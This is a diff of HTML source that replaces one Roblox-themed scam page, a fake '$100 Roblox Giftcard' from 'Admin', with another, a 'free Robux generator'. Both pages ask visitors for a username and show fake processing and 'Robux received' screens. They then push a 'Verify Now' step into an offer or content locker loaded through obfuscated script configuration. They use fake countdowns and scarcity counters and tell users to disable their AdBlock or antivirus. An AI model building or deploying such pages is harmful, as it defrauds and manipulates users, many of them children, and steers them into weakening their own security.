@@ -1,528 +1,285 @@
 <!DOCTYPE html><html lang="en"><head>
-    <!-- Simple Analytics - 100% privacy-first analytics -->
-    <script async="" src="js/latest.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin has Gifted you a $100 Roblox Giftcard</title>
-    <meta name="description" content="">
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <link rel="icon" type="image/ico" href="https://static.wikia.nocookie.net/logopedia/images/f/f4/Roblox_newest_app_icon.svg/revision/latest/scale-to-width-down/250?cb=20210608201756">
-    <!-- Open Graph Meta Tags-->
-    <meta property="og:title" content="8585.bio - Admin has Gifted you a $100 Roblox Giftcard">
-    <!-- Title which is displayed when your site is shared on social networks -->
-    <meta property="og:description" content="Reveal the secret gift from roblox!">
-    <!-- Website description which is displayed when your site is shared on social networks -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://3535.bio/"> <!-- Your Website URL -->
+    <title>EVENT FREE ROBUX</title>
+      <link href="css/bootstrap.min.css" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        /* --- ROBLOX DEFAULTS --- */
-        :root {
-            --roblox-font: 'Source Sans Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            --roblox-bg: #F2F4F5;
-            --roblox-container-bg: #FFFFFF;
-            --roblox-text-color: #232529;
-            --roblox-text-secondary: #71757D;
-            --roblox-border-color: #D8D9DA;
-            --roblox-green-button: #01A25B;
-            --roblox-green-button-shadow: #018048;
-            --roblox-blue-focus: #00A2FF;
-        }
-        
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            font-family: var(--roblox-font);
-            background-color: var(--roblox-bg);
-            color: var(--roblox-text-color);
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Cg fill-rule='evenodd'%3E%3Cg fill='%23dde0e3' fill-opacity='0.4'%3E%3Cpath d='M0 38.59l2.83-2.83 1.41 1.41L1.41 40H0v-1.41zM0 1.4l2.83 2.83 1.41-1.41L1.41 0H0v1.41zM38.59 40l-2.83-2.83 1.41-1.41L40 38.59V40h-1.41zM40 1.41l-2.83 2.83-1.41-1.41L38.59 0H40v1.41zM20 18.6l2.83-2.83 1.41 1.41L21.41 20l2.83 2.83-1.41 1.41L20 21.41l-2.83 2.83-1.41-1.41L18.59 20l-2.83-2.83 1.41-1.41L20 18.59z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
-            padding: 20px 0;
-            box-sizing: border-box;
-        }
-
-        /* --- CONTAINER STYLING --- */
-        .roblox-container {
-            text-align: center;
-            padding: 32px;
-            background-color: var(--roblox-container-bg);
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(35, 37, 41, 0.1);
-            max-width: 480px;
-            width: 90%;
-            box-sizing: border-box;
-            animation: fadeIn 0.5s ease-in-out;
-        }
-        
-        /* --- LANGUAGE SELECTOR STYLING --- */
-        #language-selector-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
-            z-index: 9999;
-            display: none; /* Initially hidden, shown by JS */
-            align-items: center;
-            justify-content: center;
-            animation: fadeIn 0.3s ease-out;
-        }
-
-        #language-selector-modal {
-            background-color: var(--roblox-container-bg);
-            padding: 24px 32px;
-            border-radius: 12px;
-            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-            animation: fadeIn 0.3s ease-out; /* Add animation to the modal itself */
-        }
-
-        #language-selector-modal h2 {
-            margin-top: 0;
-            margin-bottom: 24px;
-            font-size: 24px;
-        }
-
-        .lang-options-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .lang-option {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            padding: 12px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 8px;
-            border: 2px solid var(--roblox-border-color);
-            background-color: transparent;
-            cursor: pointer;
-            transition: background-color 0.2s, border-color 0.2s;
-            font-family: var(--roblox-font);
-            color: var(--roblox-text-color);
-        }
-
-        .lang-option:hover {
-            background-color: #f0f0f0;
-            border-color: #c0c0c0;
-        }
-        
-        .lang-option:focus {
-             outline: none;
-            border-color: var(--roblox-blue-focus);
-            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.25);
-        }
-
-        .lang-flag {
-            font-size: 24px;
-            margin-right: 12px;
-        }
-
-        /* --- TYPOGRAPHY & IMAGES --- */
-        .avatar-img {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            border: 4px solid var(--roblox-bg);
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        .giftcard-img {
-            max-width: 80%;
-            height: auto;
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-
-        h2 {
-            font-size: 28px;
-            font-weight: 700;
-            margin: 20px 0;
-            color: var(--roblox-text-color);
-        }
-        
-        h3 {
-            font-size: 14px;
-            font-weight: 400;
-            color: var(--roblox-text-secondary);
-            margin-top: 15px;
-        }
-
-        .message, p {
-            font-size: 18px;
-            line-height: 1.5;
-            color: var(--roblox-text-color);
-            margin: 20px 0;
-        }
-        
-        .message {
-            font-weight: 600;
-            font-size: 22px;
-        }
-
-        #giftcards-left {
-            font-size: 16px;
-            color: var(--roblox-text-secondary);
-            margin-top: 25px;
-        }
-
-        /* --- BUTTON STYLING --- */
-        .roblox-button {
-            background-color: var(--roblox-green-button);
-            color: white;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 8px;
-            font-size: 20px;
-            font-weight: 600;
-            font-family: var(--roblox-font);
-            cursor: pointer;
-            width: 100%;
-            box-sizing: border-box;
-            border-bottom: 4px solid var(--roblox-green-button-shadow);
-            transition: all 0.1s ease-in-out;
-            margin-top: 10px;
-        }
-
-        .roblox-button:hover {
-            filter: brightness(1.05);
-        }
-
-        .roblox-button:active {
-            transform: translateY(2px);
-            border-bottom-width: 2px;
-        }
-        
-        /* --- INPUT FIELD STYLING --- */
-        #username-input {
-            width: 100%;
-            padding: 12px 16px;
-            font-size: 18px;
-            border-radius: 8px;
-            border: 1px solid var(--roblox-border-color);
-            margin-bottom: 10px;
-            box-sizing: border-box;
-            font-family: var(--roblox-font);
-            transition: border-color 0.2s;
-        }
-
-        #username-input::placeholder {
-            color: #BDBDBD;
-        }
-
-        #username-input:focus {
-            outline: none;
-            border-color: var(--roblox-blue-focus);
-            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.25);
-        }
-
-        .error {
-            color: #DE3F3F; /* Roblox error red */
-            font-size: 14px;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        
-        /* --- LOADING SPINNER --- */
-        #processing {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .loader {
-            border: 6px solid #e3e5e8;
-            border-top: 6px solid var(--roblox-text-secondary);
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* --- SCREEN & TRANSITION LOGIC --- */
-        .screen {
-            display: none; /* All screens hidden by default */
-        }
-        .screen.active {
-            display: block; /* Active screen is shown */
-        }
-        
-        .fade-out {
-            animation: fadeOut 0.5s ease-in-out forwards;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes fadeOut {
-            from { opacity: 1; }
-            to { opacity: 0; }
-        }
-
-        /* This is part of the external script's functionality */
-        #verify-iframe {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            display: none;
-        }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/1.css">
+    <link rel="stylesheet" href="css/2.css">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
 </head>
+<body class="xload">
 
-<body>
-    <!-- ===== LANGUAGE SELECTOR POPUP ===== -->
-    <div id="language-selector-overlay">
-        <div id="language-selector-modal">
-            <h2 data-translate="selectLanguageTitle">Select Your Language</h2>
-            <div class="lang-options-container">
-                <button class="lang-option" id="lang-option-detected" style="display: none;">
-                    <span class="lang-flag" id="detected-lang-flag"></span>
-                    <span class="lang-name" id="detected-lang-name"></span>
-                </button>
-                <button class="lang-option" id="lang-option-en">
-                    <span class="lang-flag">🇺🇸</span>
-                    <span class="lang-name">English</span>
-                </button>
+    <nav>
+        <img src="images/2r.png" alt="">
+    </nav>
+    <header>
+        <p>Generate unlimited robux with our robux generator tool. You can buy any items on roblox with our robux hack. Claim your robux now before the expiry date !</p>
+        <h3>Claim your Robux Now before the expiry date !</h3>
+    </header>
+
+ <div class="container-md p-0">
+        <div class="stepx d-nonex" id="step-1">
+            <div class="item">
+                <div class="first">
+                    <img src="images/3r.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">4.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="images/5r.png" alt="">
+                        <div>400</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="images/3r.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">9.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="images/5r.png" alt="">
+                        <div>800</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="images/3r.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">19.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="images/5r.png" alt="">
+                        <div>1,700</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="images/3r.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">49.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="images/5r.png" alt="">
+                        <div>4,500</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="images/3r.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">99.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="images/5r.png" alt="">
+                        <div>10,000</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="images/3r.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">149.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="images/5r.png" alt="">
+                        <div>10,000</div>
+                    </button>
+                </div>
+            </div>
+            <div class="item">
+                <div class="first">
+                    <img src="images/3r.png" alt="">
+                    <div class="more">
+                        <div class="price">
+                            <div class="old">199.99$</div>
+                            <div class="new">0.00$</div>
+                        </div>
+                        <div class="end">Offer ends in 1 days : <span class="date"></span></div>
+                    </div>
+                </div>
+                <div class="button">
+                    <button>
+                        <img src="images/5r.png" alt="">
+                        <div>50,000</div>
+                    </button>
+                </div>
             </div>
         </div>
-    </div>
-    
-    <!-- This is the JS for the ad/offer locker -->
-    <script type="text/javascript">
-    var JHahz_JFc_JSCmUc={"it":4512328,"key":"36297"};
-</script>
-<script src="https://d3qr4eoze2yrp4.cloudfront.net/d772f81.js"></script>
-    
-    <!-- SCREEN 1: Initial Notification -->
-    <div class="roblox-container screen active" id="container">
-        <img class="avatar-img" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="Admin Avatar">
-        <div class="message" data-translate="giftMessage">Admin has gifted you a $100 Roblox Giftcard</div>
-        <button class="roblox-button" id="accept-button" data-translate="acceptButton">Accept</button>
-    </div>
 
-    <!-- SCREEN 2: Username Input -->
-    <div class="roblox-container screen" id="new-screen">
-        <h2 data-translate="usernameTitle">Please enter your Roblox Username</h2>
-        <input type="text" id="username-input" data-translate-placeholder="usernamePlaceholder" placeholder="Username">
-        <div class="error" id="error-message" style="display: none;" data-translate="usernameError">Username must be at least 3 characters long.</div>
-        <button class="roblox-button" id="done-button" data-translate="doneButton">Done!</button>
-        <div id="processing">
-            <div class="loader"></div>
-            <p data-translate="processingText">Processing your Gift Card...</p>
+        
+        <div class="step d-none" id="step-2">
+            <div class="img-robux">
+                <img src="images/7r.png" alt="">
+                <div class="rbx"><span>0</span> ROBUX</div>
+            </div>
+            <div class="input">
+                <input type="text" id="username" placeholder="Username">
+                <img src="images/8r.png" alt="">
+            </div>
+            <br>
+            <br>
+            <div class="error"></div>
+            <div class="next connect">Connect Username</div>
         </div>
-    </div>
 
-    <!-- SCREEN 3: Verification -->
-    <div class="roblox-container screen" id="claim-now">
-        <img class="giftcard-img" src="images/roblox200.jpg" alt="Roblox Giftcard">
-        <h2 data-translate="verifyTitle">Everything looks good!</h2>
-        <p data-translate="verifyMessage">Complete a quick verification to prove you're human and the gift card will be sent to your account.</p>
-        <button class="roblox-button" id="verify-button" onclick="_MS()" data-translate="verifyButton">Verify Now</button>
-        <h3 data-translate="adblockMessage">If the button doesn't work, please disable your AdBlocker!</h3>
-        <p id="giftcards-left"><span data-translate="giftcardsLeft">Gift Cards Left:</span> <span id="giftcards-count">25,000</span></p>
-    </div>
+        <div class="step d-none" id="step-3">
+            <br>
+            <div class="loader">
+                <img class="animation" src="images/6r.png" alt="">
+            </div>
+            <div class="txt">Connecting to seveur...</div>
+            <br>
+        </div>
 
-    <iframe src="#" id="verify-iframe"></iframe>
+        <div class="step d-none" id="step-4">
+            <br>
+            <div class="profile">
+                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
+                <div class="more">
+                    <div class="name">bvb</div>
+                    <div class="username ">@<span class="usr-rbx"></span></div>
+                </div>
+            </div>
+            <div class="count">
+                <div class="c-item">
+                    <div class="t-count friends">255</div>
+                    <div class="text">friends</div>
+                </div>
+                <div class="c-item">
+                    <div class="t-count followers">255</div>
+                    <div class="text">followers</div>
+                </div>
+                <div class="c-item">
+                    <div class="t-count followings">255</div>
+                    <div class="text">followings</div>
+                </div>
+            </div>
+            <div class="confirm">CONFIRM USERNAME</div>
+        </div>
 
-    <!-- Load translation data first -->
-    <script src="js/translations.js"></script>
+
+        <div class="step d-none" id="step-5">
+            <div class="last">
+                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
+                <div class="rbx-counter">
+                    <img src="images/3r.png" alt="" class="icon">
+                    <div class="rbx-count">0</div>
+                </div>
+            </div>
+            <div class="adding">
+                Adding <span class="rbx-c">800</span> Robux to <span id="username" class="usr-rbx">bvb</span>
+            </div>
+            <div class="action">
+                <button>Add Now</button>
+            </div>
+        </div>
+        <div class="step p-0 d-none" id="step-6">
+            <div class="recived rbx"><span>0</span> <img src="images/3r.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
+            <div class="userinfo">
+                <div class="main">
+                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
+                    <div class="username usr-rbx">@bvb</div>
+                </div>
+                <div class="then">
+                    <img src=" https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery/7r.png" alt="">
+                    <div class="rbx"><span>1000</span> Robux</div>
+                </div>
+            </div>
+            <div class="details">
+                <p> <span class="usr-rbx"></span>! You're one step away from reciving <span class="rbx-c"></span> robux</p>
+                <p>Click on the button to confirm that you are Human and not a Bot</p>
+                <div class="action-btn">
+                <button onclick="_nS()">Verify Now</button>
+                </div>
+                <div class="bonus"><span>Bonus : </span>Verify and earn <span class="bs"></span> extra Robux as bonus</div>
+            </div>
+        </div>
+        <div class="step p-0 d-none" id="step-7">
+            <div class="recived rbx"><span>0</span> <img src="images/3r.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
+            <div class="userinfo">
+                <div class="main">
+                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
+                    <div class="username usr-rbx">@bvb</div>
+                </div>
+                <div class="then">
+                    <img src="images/7r.png" alt="">
+                    <div class="">
+                        <div class="rbx"><span></span> ROBUX</div>
+                        <div>+<span class="bs"></span> ROBUX</div>
+                    </div>
+                </div>
+            </div>
+            <div class="details">
+           <p><span class="total"></span> Robux are ready for you!<br><br>
+If the content locker doesn't appear, please disable your AdBlock or antivirus temporarily. These tools may block essential elements required to verify your participation and deliver your Robux reward.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="notification animate__animated">
+            <div>
+                <img src="images/3r.png" alt="">
+                <div>
+                    <div class="title">Roblox</div>
+                    <div class="text">Outrageous Has got 400 Robux</div>
+                </div>
+                <div class="time">Just now</div>
+            </div>
+        </div>
     
-    <!-- Main page script -->
-    <script>
-        // --- TRANSLATION LOGIC ---
-        function translatePage(lang) {
-            const langPack = (typeof translations !== 'undefined' && translations[lang]) ? translations[lang] : (translations.en || {});
-            const defaultPack = translations.en || {};
+<script src="js/mjus6gh.js"></script>
+<script src="js/6gsj7s.js"></script>
+<script src="js/ajsyt67s.js"></script>
+<script type="text/javascript">
+    var khauJ_vru_MmZPzc={"it":4512328,"key":"36297"};
+</script>
+<script src="js/2eba16c.js"></script>
 
-            document.querySelectorAll('[data-translate]').forEach(el => {
-                const key = el.getAttribute('data-translate');
-                el.textContent = langPack[key] || defaultPack[key];
-            });
-            document.querySelectorAll('[data-translate-placeholder]').forEach(el => {
-                const key = el.getAttribute('data-translate-placeholder');
-                el.placeholder = langPack[key] || defaultPack[key];
-            });
-            document.title = langPack.pageTitle || defaultPack.pageTitle;
-        }
-
-        // --- GIFT CARD COUNTER LOGIC ---
-        function initializeCounter() {
-            const giftcardsCountEl = document.getElementById('giftcards-count');
-            const totalDuration = 60 * 60 * 1000;
-            let counterInterval;
-            let startCount = localStorage.getItem('giftcard_startCount');
-            let endTime = localStorage.getItem('giftcard_endTime');
-            const now = Date.now();
-
-            if (!endTime || now > parseInt(endTime)) {
-                startCount = Math.floor(Math.random() * (25000 - 20000 + 1)) + 20000;
-                endTime = now + totalDuration;
-                localStorage.setItem('giftcard_startCount', startCount);
-                localStorage.setItem('giftcard_endTime', endTime);
-            } else {
-                startCount = parseInt(startCount);
-                endTime = parseInt(endTime);
-            }
-
-            if (counterInterval) clearInterval(counterInterval);
-            counterInterval = setInterval(() => {
-                const timeRemaining = parseInt(endTime) - Date.now();
-                if (timeRemaining <= 0) {
-                    giftcardsCountEl.textContent = "0";
-                    clearInterval(counterInterval);
-                } else {
-                    const percentageLeft = timeRemaining / totalDuration;
-                    const currentCount = Math.floor(startCount * percentageLeft);
-                    giftcardsCountEl.textContent = Math.max(0, currentCount).toLocaleString('en-US');
-                }
-            }, 1000);
-        }
-
-        // --- MAIN UI EXECUTION ---
-        document.addEventListener('DOMContentLoaded', () => {
-            const screens = {
-                container: document.getElementById('container'),
-                newScreen: document.getElementById('new-screen'),
-                claimNow: document.getElementById('claim-now')
-            };
-            
-            const langPopup = document.getElementById('language-selector-overlay');
-            const detectedLangButton = document.getElementById('lang-option-detected');
-            const englishLangButton = document.getElementById('lang-option-en');
-
-            function showScreen(screenId) {
-                Object.values(screens).forEach(screen => screen.classList.remove('active'));
-                screens[screenId].classList.add('active');
-            }
-            
-            function initializeMainPageInteractions() {
-                translatePage('en');
-                initializeCounter();
-
-                document.getElementById('accept-button').addEventListener('click', function() {
-                    screens.container.classList.add('fade-out');
-                    setTimeout(() => {
-                        screens.container.classList.remove('active', 'fade-out');
-                        showScreen('newScreen');
-                    }, 400);
-                });
-
-                document.getElementById('done-button').addEventListener('click', function() {
-                    const usernameInput = document.getElementById('username-input');
-                    const errorMessage = document.getElementById('error-message');
-                    const processing = document.getElementById('processing');
-                    const doneButton = this;
-
-                    if (usernameInput.value.length >= 3) {
-                        errorMessage.style.display = 'none';
-                        processing.style.display = 'block';
-                        doneButton.style.display = 'none';
-                        usernameInput.disabled = true;
-
-                        setTimeout(() => {
-                            screens.newScreen.classList.add('fade-out');
-                            setTimeout(() => {
-                                screens.newScreen.classList.remove('active', 'fade-out');
-                                showScreen('claimNow');
-                            }, 400);
-                        }, 2000);
-                    } else {
-                        errorMessage.style.display = 'block';
-                    }
-                });
-            }
-
-            function selectLanguageAndClose(langCode) {
-                translatePage(langCode);
-                langPopup.style.display = 'none';
-            }
-            
-            detectedLangButton.addEventListener('click', () => selectLanguageAndClose(detectedLangButton.getAttribute('data-lang')));
-            englishLangButton.addEventListener('click', () => selectLanguageAndClose('en'));
-            
-            // This function processes the country code to decide if a popup should be shown.
-            function processCountryCode(countryCode) {
-                if (!countryCode) return;
-
-                const isTranslationDataReady = typeof countryToLang !== 'undefined' && typeof translations !== 'undefined' && typeof langNames !== 'undefined';
-                if (!isTranslationDataReady) {
-                    console.log("Translation data not yet available.");
-                    return;
-                }
-
-                const localLangCode = countryToLang[countryCode];
-
-                // If a supported, non-english language is found, prepare and show the popup.
-                if (localLangCode && localLangCode !== 'en' && translations[localLangCode] && langNames[localLangCode]) {
-                    document.getElementById('detected-lang-flag').textContent = countryCode.toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397));
-                    document.getElementById('detected-lang-name').textContent = langNames[localLangCode];
-                    detectedLangButton.setAttribute('data-lang', localLangCode);
-                    
-                    const popupTitle = document.querySelector('#language-selector-modal h2');
-                    popupTitle.textContent = translations[localLangCode].selectLanguageTitle || translations.en.selectLanguageTitle;
-                    
-                    detectedLangButton.style.display = 'flex';
-                    langPopup.style.display = 'flex';
-                }
-            }
-            
-            async function getGeoDataForLanguage() {
-                // Check session storage first for faster subsequent interactions
-                const cachedCountryCode = sessionStorage.getItem('userCountryCode');
-                if (cachedCountryCode) {
-                    processCountryCode(cachedCountryCode);
-                    return;
-                }
-
-                try {
-                    // Use get.geojs.io API to get geolocation data.
-                    const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
-                    if (!response.ok) throw new Error('GeoJS API request failed'); 
-                    const geoData = await response.json();
-                    
-                    // Check if a country code was returned.
-                    if (geoData.country_code) {
-                        const countryCode = geoData.country_code;
-                        sessionStorage.setItem('userCountryCode', countryCode); // Cache the result
-                        processCountryCode(countryCode); // Process for language selection
-                    } else {
-                       throw new Error('GeoJS API did not return a valid country code.');
-                    }
-
-                } catch (error) {
-                    console.error('Failed to get geo data for language detection:', error);
-                    // If the API fails, the site will simply default to English.
-                }
-            }
-
-            // --- APPLICATION START ---
-            initializeMainPageInteractions();
-            getGeoDataForLanguage();
-        });
-    </script>
-    
-
+  
 
 </body></html>
